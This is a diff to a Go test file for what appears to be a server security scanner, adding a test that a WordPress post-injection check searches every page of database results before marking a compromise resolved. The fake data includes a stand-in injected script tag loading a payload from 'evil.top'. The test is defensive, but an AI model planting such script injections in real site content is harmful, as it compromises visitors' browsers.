@@ -1,6 +1,7 @@
 package checks
 
 import (
+	"fmt"
 	"strings"
 	"testing"
 )
@@ -31,5 +32,37 @@ func TestVerifyDBPostInjectionSearchesWholeTableNotSampledIDs(t *testing.T) {
 	res := verifyDBPostInjection(msg, details)
 	if !res.Checked || res.Resolved {
 		t.Fatalf("finding resolved although an unsampled post still carries the injection: %+v", res)
+	}
+}
+
+// LIMIT bounds each database read, not the total search. Fifty benign script
+// tags may sort ahead of a malicious external script, so stopping after one
+// page falsely resolves a live compromise.
+func TestVerifyDBPostInjectionPagesThroughAllCandidates(t *testing.T) {
+	details := "Database: alice_wp\nPattern: <script"
+	msg := "WordPress posts contain injected scripts (account: alice, 1 post)"
+	withWPVerifyDiscovery(t, "alice", "alice_wp", "wp_")
+	queries := 0
+	withRootQuery(t, func(_, query string, args ...any) ([]string, error) {
+		if !strings.Contains(query, "LIKE") {
+			return nil, nil
+		}
+		queries++
+		if queries == 1 {
+			rows := make([]string, dbVerifyPostSearchLimit)
+			for i := range rows {
+				rows[i] = fmt.Sprintf("%d\t<script src=\"/local-%d.js\"></script>\t", i+1, i+1)
+			}
+			return rows, nil
+		}
+		return []string{"51\t<script src=\"https://evil.top/payload.js\"></script>\t"}, nil
+	})
+
+	res := verifyDBPostInjection(msg, details)
+	if !res.Checked || res.Resolved {
+		t.Fatalf("finding resolved although a later page still carries the injection: %+v", res)
+	}
+	if queries != 2 {
+		t.Fatalf("candidate query ran %d times, want 2 pages", queries)
 	}
 }
